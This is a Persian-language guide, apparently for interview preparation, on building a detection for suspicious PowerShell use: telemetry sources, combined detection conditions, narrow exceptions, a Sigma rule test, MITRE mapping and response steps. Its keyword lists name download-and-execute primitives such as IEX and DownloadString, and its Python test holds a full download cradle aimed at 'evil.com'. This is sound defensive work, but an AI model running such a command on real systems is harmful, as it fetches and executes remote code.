### 1. تعریف سناریو و هدف Detection

هدف، طراحی یک **Use Case** برای تشخیص **اجرای مشکوک PowerShell** است که هم **False Positive** را کنترل کند و هم **Detection واقعی** (مانند Download Cradle، Encoded Command، و Obfuscation) را از دست ندهد.

**نکته حیاتی:** PowerShell یکی از پرکاربردترین **LOLBin**ها است. Detection باید **رفتار** را تشخیص دهد، نه صرفاً وجود `powershell.exe` را. تمرکز اصلی روی **الگوهای ترکیبی** (Download + Execute)، **Command Line مبهم** (`-enc`، `IEX`)، و **Context غیرعادی** (Parent Process، User، Path) است.

### 2. فرضیه اصلی و فرضیه‌های جایگزین

| فرضیه | توضیح | شواهد تقویت‌کننده | شواهد تضعیف‌کننده |
|---|---|---|---|
| **فرضیه اصلی (Malicious PowerShell)** | مهاجم از PowerShell برای **Download Cradle**، **Encoded Command**، یا **Obfuscated Execution** استفاده می‌کند | Command Line شامل ترکیب **Download + Execute** (`IEX` + `DownloadString`)، `-EncodedCommand`، `FromBase64String`، Parent Process غیرعادی  | Process قانونی (SCCM، Monitoring Agent)، Command Line قابل توضیح |
| **فرضیه جایگزین (Legitimate Admin)** | Admin از PowerShell برای **Management** یا **Automation** استفاده می‌کند | Script از مسیر شناخته‌شده، Parent Process قانونی (`explorer.exe`، `mmc.exe`)، Command Line بدون Obfuscation | Command Line مبهم، Parent Process مشکوک |

### 3. Telemetry و Data Sources

| منبع | نقش | چه چیزی را بررسی کنیم |
|---|---|---|
| **Sysmon Event ID 1** (Essential) | Process Creation | `Image`، `CommandLine`، `ParentImage`، `ParentCommandLine`، `User`، `Hashes`  |
| **PowerShell Operational Log — Event ID 4104** (Essential) | Script Block Logging | `ScriptBlockText` (محتوای **Deobfuscated** اسکریپت)  |
| **DeviceProcessEvents (Defender XDR)** (Essential) | Advanced Hunting | `ProcessCommandLine`، `InitiatingProcessFileName`، `InitiatingProcessCommandLine`، `AccountName`  |

**محدودیت مهم:** **Script Block Logging (4104)** به‌صورت پیش‌فرض **فعال نیست** و باید از طریق GPO یا Registry فعال شود . همچنین، PowerShell 5.1 و PowerShell 7 (pwsh) در **Channelهای متفاوتی** لاگ می‌کنند .

### 4. منطق تشخیص و فیلدهای لازم

**منطق تشخیص باید بر اساس ترکیب چند شرط باشد، نه یک شرط تنها:**

**شرط ۱: Download Cradle Pattern**
ترکیب **Download Cmdlet** + **Execution Primitive** در یک Command Line:
- Download: `Invoke-WebRequest`، `IWR`، `Invoke-RestMethod`، `IRM`، `DownloadString`، `DownloadFile`
- Execute: `IEX`، `Invoke-Expression`، `&`، `|` 

**شرط ۲: Encoded/Obfuscated Command**
- `-EncodedCommand` (نه `-enc` که با `-encoding` اشتباه می‌شود)
- `FromBase64String`، `[Convert]::`
- `-WindowStyle Hidden`، `-NoProfile`، `-ExecutionPolicy Bypass` 

**شرط ۳: Context غیرعادی**
- Parent Process غیرسیستمی: `winword.exe`، `excel.exe`، `outlook.exe`، `mshta.exe`
- Process Path غیرعادی: `C:\Users\Public\`، `C:\Temp\`، `C:\AppData\`
- User Account غیرعادی (Service Account، غیرAdmin)

**فیلدهای کلیدی برای Detection:**

| فیلد | منبع | اهمیت |
|---|---|---|
| `ProcessCommandLine` | Sysmon EID 1 / DeviceProcessEvents | الگوی Download + Execute  |
| `InitiatingProcessFileName` | Sysmon EID 1 / DeviceProcessEvents | Parent Process مشکوک  |
| `InitiatingProcessCommandLine` | Sysmon EID 1 / DeviceProcessEvents | Command Line والد  |
| `AccountName` | Sysmon EID 1 / DeviceProcessEvents | User Context  |
| `ScriptBlockText` (4104) | PowerShell Operational | محتوای Deobfuscated (اگر Command Line مبهم باشد)  |

### 5. استثناها (Exceptions)

**استثناها باید **باریک** و **مستند** باشند، نه Suppression کلی:**

| استثنا | دلیل | شرط |
|---|---|---|
| **SCCM/Intune** | Deployment قانونی PowerShell Script | `ParentImage` شامل `CcmExec.exe` یا `IntuneManagementExtension.exe`  |
| **Monitoring Agents** | Datadog، New Relic، CrowdStrike | `ParentImage` شامل Agent Path شناخته‌شده |
| **Admin Scripts** | Automation قانونی از Jump Server | `ParentImage` از `C:\Program Files\` + User در Group IT Admins |

**هشدار:** استثنا بر اساس **Parent Process** یک **Trade-off** است — مهاجم می‌تواند فایل خود را در مسیر Agent قرار دهد. بنابراین، استثناها باید **مستند** و **دوره‌ای** بازبینی شوند.

### 6. روش تست Detection

**مرحله A: تست با Sampleهای واقعی**
از **EVTX-ATTACK-SAMPLES** یا **Chainsaw** برای تست Rule با نمونه‌های واقعی استفاده کنید :
```bash
./chainsaw hunt evtx_attack_samples/ -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/
```

**مرحله B: تست با sigma-rule-matcher**
از کتابخانه **sigma-rule-matcher** برای ارزیابی Rule علیه Eventهای ساختاریافته استفاده کنید :
```python
from sigma.rule import SigmaRule
from sigma_rule_matcher import RuleMatcher

sigma_rule = '''
title: Suspicious PowerShell Download Cradle
logsource:
  product: windows
  category: process_creation
detection:
  selection_download:
    CommandLine|contains:
      - 'DownloadString'
      - 'Invoke-WebRequest'
      - 'IWR'
  selection_execute:
    CommandLine|contains:
      - 'IEX'
      - 'Invoke-Expression'
  condition: selection_download and selection_execute
'''

rule = SigmaRule.from_yaml(sigma_rule)
matcher = RuleMatcher(rule)
event = {'CommandLine': 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/p.ps1")'}
assert matcher.match(event) is True
```

**مرحله C: Shadow Mode**
Rule جدید را **۱۴ روز** در حالت **Shadow** اجرا کنید (Alert تولید می‌کند اما Action نمی‌گیرد). **Precision** و **Recall** را اندازه بگیرید:
- **Precision:** `TP / (TP + FP)` — هدف: بالای **80%**
- **Recall:** تأیید کنید **همه TPهای قبلی** هنوز Alert می‌دهند

### 7. MITRE ATT&CK Mapping

| Technique ID | Name | شواهد |
|---|---|---|
| **T1059.001** | PowerShell | اجرای PowerShell با Command Line مشکوک  |
| **T1027** | Obfuscated Files or Information | `-EncodedCommand`، Base64 Encoding  |
| **T1105** | Ingress Tool Transfer | Download Cradle (`DownloadString` + `IEX`)  |

### 8. نتیجه‌گیری و سطح اطمینان

**Detection باید بر اساس **ترکیب شرط‌ها** باشد، نه یک شرط تنها. Download Cradle (`IEX` + `DownloadString`) یک **High-Confidence Indicator** است . `-EncodedCommand` **Medium-High** است (بسته به Context). `-WindowStyle Hidden` **Medium** است.

**Confidence: High** — اگر Detection شامل **ترکیب Download + Execute** و **Context غیرعادی** باشد.

### 9. Response و بهبود Detection

**اقدامات فوری:**
1. **Endpoint Isolation** اگر Download Cradle تأیید شد.
2. **Process Kill** و **Memory Dump** برای Forensic.
3. **Network Blocking** مقصد Download.

**Detection Improvement:**
1. **Script Block Logging (4104):** فعال‌سازی برای دیدن محتوای **Deobfuscated** .
2. **PowerShell 7 Coverage:** اطمینان از پوشش `pwsh.exe` و `PowerShellCore/Operational` .
3. **Baseline Tuning:** شناسایی Agentهای قانونی که از PowerShell استفاده می‌کنند.

### 10. پاسخ کوتاه برای شروع جواب در مصاحبه

برای Detection مشکوک PowerShell، اول **Data Source** رو مشخص می‌کنم: **Sysmon EID 1** برای Command Line، و **PowerShell 4104** برای Script Block محتوای Deobfuscated .

**منطق تشخیص** رو بر اساس **ترکیب شرط‌ها** می‌سازم: **Download Cmdlet** (`DownloadString`، `IWR`) + **Execution Primitive** (`IEX`، `Invoke-Expression`) در یک Command Line. این **High-Confidence Indicator** برای Download Cradle هست .

**فیلدهای کلیدی** شامل `ProcessCommandLine`، `InitiatingProcessFileName`، و `AccountName` هستن .

**استثناها** رو بر اساس **Parent Process** شناخته‌شده (SCCM، Monitoring Agent) اعمال می‌کنم، نه Suppression کلی.

**محدودیت اصلی:** Script Block Logging (4104) به‌صورت پیش‌فرض فعال نیست و باید GPO فعال بشه .

**اقدام بعدی:** Rule رو با **Chainsaw** و Sampleهای واقعی تست می‌کنم، بعد **۱۴ روز** در Shadow Mode اجرا می‌کنم و **Precision** رو اندازه می‌گیرم.
